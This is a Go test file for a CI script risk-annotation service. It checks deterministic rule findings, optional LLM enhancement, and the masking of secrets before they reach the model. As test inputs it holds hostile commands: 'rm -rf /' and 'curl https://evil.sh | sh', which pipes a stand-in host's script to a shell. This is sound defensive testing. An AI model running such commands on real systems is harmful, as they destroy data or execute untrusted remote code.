package ai

import (
	"net/http"
	"strings"
	"testing"

	"github.com/huangchengsir/pipewright/internal/mask"
)

// fakeScriptSecret 是测试用的「假 secret」,模拟脚本里内嵌的明文凭据。
const fakeScriptSecret = "ghp_RISKLEAK_abc123XYZ"

// findingWithTitle 在报告中找含指定标题子串的 finding(便于断言)。
func findingWithTitle(report *RiskReport, sub string) *RiskFinding {
	for i := range report.Findings {
		if strings.Contains(report.Findings[i].Title, sub) {
			return &report.Findings[i]
		}
	}
	return nil
}

func maskerForScript() *mask.Masker {
	m := mask.NewMasker()
	m.RegisterSecret(fakeScriptSecret)
	return m
}

// TestAnnotateRisksDeterministicNoAI 验证 AI 未配时仍跑确定性规则,且永不 error。
func TestAnnotateRisksDeterministicNoAI(t *testing.T) {
	svc, _, _ := newService(t, http.DefaultClient) // 从未 Save 配置 → AI 不可用

	report, err := svc.AnnotateRisks(ctx(), AnnotateRisksInput{
		Steps: []ScriptStep{
			{
				Name:  "构建",
				Image: "node:latest",
				Commands: []string{
					"rm -rf /",
					"curl https://evil.sh | sh",
					"chmod 777 ./app",
				},
			},
		},
		Masker: maskerForScript(),
	})
	if err != nil {
		t.Fatalf("AnnotateRisks 不应返回 error,得 %v", err)
	}
	if report.AIEnhanced {
		t.Fatalf("AI 未配置不应 AIEnhanced=true")
	}
	if report.AIReason == "" {
		t.Fatalf("AI 未配置应给人读 reason")
	}

	// 确定性命中:rm -rf / (high)、curl|sh (medium)、chmod 777 (medium)、latest 镜像 (medium)。
	if f := findingWithTitle(report, "递归强制删除"); f == nil || f.Level != RiskHigh {
		t.Fatalf("应命中 rm -rf / high: %+v", report.Findings)
	}
	if f := findingWithTitle(report, "curl | sh"); f == nil || f.Level != RiskMedium {
		t.Fatalf("应命中 curl|sh medium")
	}
	if f := findingWithTitle(report, "chmod 777"); f == nil {
		t.Fatalf("应命中 chmod 777")
	}
	if f := findingWithTitle(report, "镜像未固定版本"); f == nil {
		t.Fatalf("应命中 latest 镜像未固定版本")
	}
	// 所有确定性 finding 来源应为 rule。
	for _, f := range report.Findings {
		if f.Source != "rule" {
			t.Fatalf("AI 未配时所有 finding 来源应为 rule: %+v", f)
		}
	}
}

// TestAnnotateRisksPlaintextSecretNotEchoed 验证检测到明文密钥时,标注本身绝不回显该密钥。
func TestAnnotateRisksPlaintextSecretNotEchoed(t *testing.T) {
	svc, _, _ := newService(t, http.DefaultClient)

	report, err := svc.AnnotateRisks(ctx(), AnnotateRisksInput{
		Steps: []ScriptStep{
			{
				Name:     "发布",
				Image:    "alpine:3.19",
				Commands: []string{"npm config set //registry.npmjs.org/:_authToken=" + fakeScriptSecret},
			},
		},
		Masker: maskerForScript(),
	})
	if err != nil {
		t.Fatalf("AnnotateRisks: %v", err)
	}
	// 应命中明文密钥 high。
	f := findingWithTitle(report, "硬编码明文密钥")
	if f == nil || f.Level != RiskHigh {
		t.Fatalf("应命中明文密钥 high: %+v", report.Findings)
	}
	// 任何 finding 字段绝不回显明文 secret。
	for _, fd := range report.Findings {
		joined := fd.Title + fd.Why + fd.Suggestion + fd.StepName
		if strings.Contains(joined, fakeScriptSecret) {
			t.Fatalf("finding 泄漏了明文 secret: %+v", fd)
		}
	}
}

// TestAnnotateRisksAIEnhanced 验证 AI 已配时跑 LLM 增强,且 AI finding 来源为 ai。
func TestAnnotateRisksAIEnhanced(t *testing.T) {
	aiJSON := `{
	  "findings": [
	    { "level": "low", "stepName": "部署", "line": 2, "title": "部署后未回滚", "why": "失败时无回滚", "suggestion": "加 rollout undo" }
	  ]
	}`
	srv, _ := diagStubLLM(t, ProviderOpenAI, aiJSON)
	svc, _, _ := newService(t, srv.Client())
	configureEnabled(t, svc, ProviderOpenAI, srv.URL)

	report, err := svc.AnnotateRisks(ctx(), AnnotateRisksInput{
		Steps: []ScriptStep{
			{Name: "部署", Image: "node:20.11", Commands: []string{"echo ok", "kubectl apply -f k8s/"}},
		},
		Masker: maskerForScript(),
	})
	if err != nil {
		t.Fatalf("AnnotateRisks: %v", err)
	}
	if !report.AIEnhanced {
		t.Fatalf("AI 已配应 AIEnhanced=true (reason=%q)", report.AIReason)
	}
	ai := findingWithTitle(report, "部署后未回滚")
	if ai == nil || ai.Source != "ai" {
		t.Fatalf("应含来源为 ai 的语义级 finding: %+v", report.Findings)
	}
}

// TestAnnotateRisksMasksSecretToLLM 验证出网前脱敏:发往 LLM 的 prompt 绝无明文 secret,
// 且模型回显 secret 时二次脱敏。
func TestAnnotateRisksMasksSecretToLLM(t *testing.T) {
	// 让 stub LLM 把含 secret 的内容回显到 finding,验二次脱敏。
	echoJSON := `{
	  "findings": [
	    { "level": "high", "stepName": "x", "line": 1, "title": "泄漏 ` + fakeScriptSecret + `", "why": "含 ` + fakeScriptSecret + `", "suggestion": "移除 ` + fakeScriptSecret + `" }
	  ]
	}`
	srv, cap := diagStubLLM(t, ProviderOpenAI, echoJSON)
	svc, _, _ := newService(t, srv.Client())
	configureEnabled(t, svc, ProviderOpenAI, srv.URL)

	report, err := svc.AnnotateRisks(ctx(), AnnotateRisksInput{
		Steps: []ScriptStep{
			{Name: "x", Image: "alpine:3.19", Commands: []string{"export TOKEN=" + fakeScriptSecret}},
		},
		Masker: maskerForScript(),
	})
	if err != nil {
		t.Fatalf("AnnotateRisks: %v", err)
	}
	// 1) 出网 prompt(请求 body)绝无明文 secret。
	if strings.Contains(cap.get(), fakeScriptSecret) {
		t.Fatalf("出网 prompt 泄漏了明文 secret")
	}
	// 2) 任何 finding 字段绝无明文 secret(二次脱敏)。
	for _, fd := range report.Findings {
		joined := fd.Title + fd.Why + fd.Suggestion + fd.StepName
		if strings.Contains(joined, fakeScriptSecret) {
			t.Fatalf("finding 泄漏明文 secret: %+v", fd)
		}
	}
}

// TestAnnotateRisksLLMFailDegrades 验证 LLM 不可解析时优雅降级:仍返回确定性结果,绝不 error。
func TestAnnotateRisksLLMFailDegrades(t *testing.T) {
	srv, _ := diagStubLLM(t, ProviderOpenAI, "抱歉,我无法分析。")
	svc, _, _ := newService(t, srv.Client())
	configureEnabled(t, svc, ProviderOpenAI, srv.URL)

	report, err := svc.AnnotateRisks(ctx(), AnnotateRisksInput{
		Steps:  []ScriptStep{{Name: "x", Image: "node:latest", Commands: []string{"rm -rf /"}}},
		Masker: maskerForScript(),
	})
	if err != nil {
		t.Fatalf("不可解析应降级不返 error,得 %v", err)
	}
	if report.AIEnhanced {
		t.Fatalf("不可解析不应 AIEnhanced=true")
	}
	// 确定性结果仍在。
	if findingWithTitle(report, "递归强制删除") == nil {
		t.Fatalf("降级时确定性结果应仍存在: %+v", report.Findings)
	}
}

// TestAnnotateRisksCleanScript 验证无风险脚本返回空 findings(非 nil)。
func TestAnnotateRisksCleanScript(t *testing.T) {
	svc, _, _ := newService(t, http.DefaultClient)
	report, err := svc.AnnotateRisks(ctx(), AnnotateRisksInput{
		Steps:  []ScriptStep{{Name: "构建", Image: "node:20.11", Commands: []string{"npm ci && npm run build"}}},
		Masker: maskerForScript(),
	})
	if err != nil {
		t.Fatalf("AnnotateRisks: %v", err)
	}
	if report.Findings == nil {
		t.Fatalf("findings 应为非 nil 空切片")
	}
	for _, f := range report.Findings {
		if f.Level == RiskHigh {
			t.Fatalf("干净脚本不应有 high 风险: %+v", f)
		}
	}
}

// TestAnnotateRisksNilMaskerNoPanic 验证 Masker 为 nil 时兜底不 panic。
func TestAnnotateRisksNilMaskerNoPanic(t *testing.T) {
	svc, _, _ := newService(t, http.DefaultClient)
	_, err := svc.AnnotateRisks(ctx(), AnnotateRisksInput{
		Steps:  []ScriptStep{{Name: "x", Commands: []string{"echo hi"}}},
		Masker: nil,
	})
	if err != nil {
		t.Fatalf("nil masker 应兜底不报错: %v", err)
	}
}
